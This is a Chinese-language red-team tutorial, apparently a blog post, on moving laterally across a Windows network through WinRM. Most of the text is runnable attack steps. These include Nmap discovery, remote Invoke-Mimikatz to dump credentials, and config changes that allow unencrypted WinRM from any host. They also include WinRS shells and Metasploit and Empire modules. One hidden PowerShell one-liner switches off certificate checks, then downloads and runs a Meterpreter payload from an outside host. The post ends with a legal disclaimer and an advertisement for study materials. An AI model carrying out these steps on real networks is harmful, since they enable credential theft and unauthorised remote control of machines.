# 原创
：  横向移动 – WinRM

# 横向移动 – WinRM

### 前言

同学们可能没有听说过WinRM横向移动技术，今天我给大家分析讲解一波儿<br/> 看不懂也没关系，先看看有个大概的概念，以后慢慢就懂了

### 技术解释

WinRM 代表 Windows 远程管理，是一种允许管理员远程在系统上执行管理任务的服务。通信通过 HTTP (5985) 或 HTTPS SOAP (5986) 执行，默认情况下支持 Kerberos 和 NTLM 身份验证以及基本身份验证。使用此服务需要管理员级别的凭据。

在红队场景中，如果已获得本地管理员访问权限，则如果使用 WinRM 管理服务器，则这些凭据可用于网络内部的横向移动。

### 端口发现利用

打开端口 5985 的主机正在运行 WinRM 服务。可以使用简单的 Nmap 扫描来确定这些主机
1.  `nmap -p 5985 -sV 10.0.0.2 10.0.0.1` 
<br/> 如果端口 5985 打开但端口 5986 关闭，这说明着 WinRM 服务配置为仅接受通过 HTTP 的连接并且未启用加密

<br/> 从已经具有本地管理员访问权限且这些权限与目标系统共享的系统中，PowerShell Invoke-Command可用于通过 WinRM 服务执行命令
1.  `Invoke-Command -ComputerName TARGET -ScriptBlock { dir c:\ }` 
<br/> Mimikatz 还可以远程执行以检索存储在内存中的凭据，而无需将任何二进制文件放入磁盘
1.  `Import-Module ./Invoke-Mimikatz.ps1` 1.  `Invoke-Mimikatz -ComputerName TARGET` 
<br/> 然后，这些凭据可用于访问其他系统，这会导致域升级

对于不运行 WinRM 的系统，可以使用合法的 Windows 服务来启用和配置此服务以实现持久性。以下命令将启用 WinRM
1.  `Enable-PSRemoting -Force` 
<br/> 默认情况下，可能无法通过 WinRM 连接到另一个系统，并且可能需要其他配置。以下命令将有助于正确配置服务，以便从任何主机进行 HTTP 访问
1.  `winrm quickconfig` 1.  `winrm set winrm/config/Client &lt;span class="label label-primary"&gt;@{AllowUnencrypted&lt;/span&gt; = "true"}` 1.  `Set-Item WSMan:localhost\client\trustedhosts -value *` 
### WinRS

Windows 远程外壳 (WinRS) 是一个命令行工具，是 Windows 2008 及更高版本的一部分。如果启用了 WinRM，则可以使用该实用程序在主机上远程执行命令。cmd参数将通过命令提示符建立一个新的 shell
1.  `winrs -r:http://WIN-2NE38K15TGH/wsman "cmd"` 
<br/> 或者，可以执行命令来代替 shell 命令提示符，以便对目标执行静默侦察
1.  `winrs -r:http://WIN-2NE38K15TGH/wsman "net localgroup administrators"` 
<br/> 还可以通过 Metasploit 网络交付模块将 Windows Remote Shell 访问升级为 Meterpreter 会话。该模块将生成一个有效负载，该有效负载将在本地托管，并将生成需要在目标上执行的 PowerShell 命令。
1.  `use multi/script/web_delivery` 
<br/> 从已通过 WinRS 连接的系统执行 PowerShell 命令将下载并执行任意代码
1.  `powershell.exe -nop -w hidden -c [System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$h=new-object net.webclient;$h.proxy=[Net.WebRequest]::GetSystemWebProxy();$h.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $h.downloadstring('https://10.0.0.3:8080/4WM88bQsuZS');` 
<br/> Meterpreter 会话将打开，这将在后期开发活动方面提供更大的灵活性。

<br/> 可以使用命令会话和关联的会话号来实现与新系统的交互。

### 元分析软件

Metasploit Framework 有多个模块，可用于发现启用了 WinRM 服务的主机、发现服务身份验证的凭据以及执行任意命令和代码。以下模块可以发现启用了 WinRM 服务的系统及其支持的身份验证协议。
1.  `auxiliary/scanner/winrm/winrm_auth_methods` 
<br/> 如果已获取本地管理员凭据，则可以使用这些凭据通过 WinRM 服务对其他主机进行身份验证。以下模块可以确定本地管理员凭据对于其他系统是否有效。
1.  `auxiliary/scanner/winrm/winrm_login` 
<br/> Metasploit 还有一个可以通过 WinRM 服务执行任意命令的模块。该模块需要本地管理员凭据、域和目标主机。
1.  `auxiliary/scanner/winrm/winrm_cmd` 
<br/> 命令的输出将被返回：<br/>  

<br/> 也可以通过 WinRM 和以下模块执行任意代码。该模块需要本地管理员凭据和代码将执行的主机列表。该模块可用于横向移动到共享同一本地管理员帐户的主机。
1.  `exploit/windows/winrm/winrm_script_exec` 
<br/> 在利用该模块时，该模块将尝试修改 PowerShell 执行策略以允许执行未签名的脚本。然后一个 PowerShell 脚本将被写入磁盘并自动执行以返回一个 Meterpreter 会话。该模块还将尝试迁移到 SYSTEM 级别的进程，以避免因 WinRS 的时间限制而丢失 shell。

<br/> Empire<br/> 利用 Empire 的参与，有一个PowerShell 模块，可以通过 WinRM 远程执行代码，以扩展网络内的访问。使用此模块的要求是：本地管理员凭据、侦听器、代理和目标主机
1.  `usemodule lateral_movement/invoke_psremoting` 
<br/> 可以使用命令代理来检索活动代理的列表。以下命令将与新代理 X5DACN91 交互。<br/>`interact`<br/>  

<br/> 可以在通过 WinRM 服务受到损害的主机上执行攻击后命令

<br/> Empire – 通过 WinRM 执行命令

本次攻击演示到此结束~

 申明：本账号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法。

###### **免费领取安全学习资料包！**<img alt="" height="768" src="https://img-blog.csdnimg.cn/direct/2f74894cf8e04b7f87d9716681f6e26b.png" width="1024"/>

渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/direct/5b4209eac3784bd18f5e1cd6a5157e4e.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/direct/4a89b0c2a52a4f569a970e55dcbac0b4.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/direct/4f211474c8ab4a5a910884e1d3423310.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/direct/54c2816350ae4bf787d1c6eec0d4e837.png" width="665"/>

应急响应笔记

学习路线
